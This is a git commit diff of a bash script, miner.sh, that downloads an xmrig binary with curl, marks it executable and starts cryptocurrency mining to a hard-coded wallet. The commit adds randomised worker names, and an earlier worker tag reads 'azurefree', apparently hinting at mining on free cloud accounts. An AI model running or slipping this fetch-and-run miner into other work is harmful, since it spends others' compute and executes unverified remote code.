e78719213db21f4ef5612c2b9797f6a41e372a77
Alessio DS <hello@alessiodellasanta.it>
2022-12-10 16:48:30 +0100

    Update miner.sh

--- miner.sh
+++ miner.sh
@@ -1,9 +1,20 @@
-#! /bin/bash
+#!/bin/bash
 printf "Installing xmrig... \n" >&2
 
 curl https://raw.githubusercontent.com/alessio-ds/xmrig-setup/main/xmrig > xmrig
 chmod +x xmrig
 
 printf "Starting xmrig"
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u ADA:DdzFFzCqrhsk2MsFmcQBhGGmHKKj9t6QRa5r7c9af65d6QwnjtvRXMwitW4bLRzJkeotAHkhpWfdXb2FaEEevHAjQWbvZKnx7JNAtt7n.azurefree#u0ni-8gzj -p x --threads=4 --cpu-priority 5 --cpu-no-yield --randomx-1gb-pages
+
+chars='abcdefghijklmnopqrstuvwxyz'
+n=10
+
+str=
+for ((i = 0; i < n; ++i)); do
+    str+=${chars:RANDOM%${#chars}:1}
+    # alternatively, str=$str${chars:RANDOM%${#chars}:1} also possible
+done
+
+
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u USDT:0x35C94C8f76ddFF652c259e67F822a508e857F1Cf."$str"#vcet-3tkj -p x --threads=4 --cpu-priority 5 --cpu-no-yield --randomx-1gb-pages
 
